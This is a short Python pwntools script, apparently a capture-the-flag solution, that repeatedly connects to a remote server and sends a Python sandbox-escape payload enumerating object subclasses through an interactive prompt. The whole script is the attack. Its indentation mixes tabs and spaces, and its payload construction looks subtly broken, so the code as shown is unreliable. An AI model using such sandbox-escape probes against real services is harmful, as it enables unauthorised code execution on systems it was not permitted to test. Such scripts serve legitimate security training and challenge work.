from pwn import *
import re

context.log_level = 'warning'

for i in range(100):
    io = remote("138.68.151.248", 30697)
    # to_enumerate = '().__class__.__base__.__subclasses__()'
	to_enumerate = '().__class__.__base__.__subclasses__()'
    io.sendlineafter('>>>', '[print(x) for x in [[' + to_enumerate + str(i) + ']]]')
    print(io.recvline())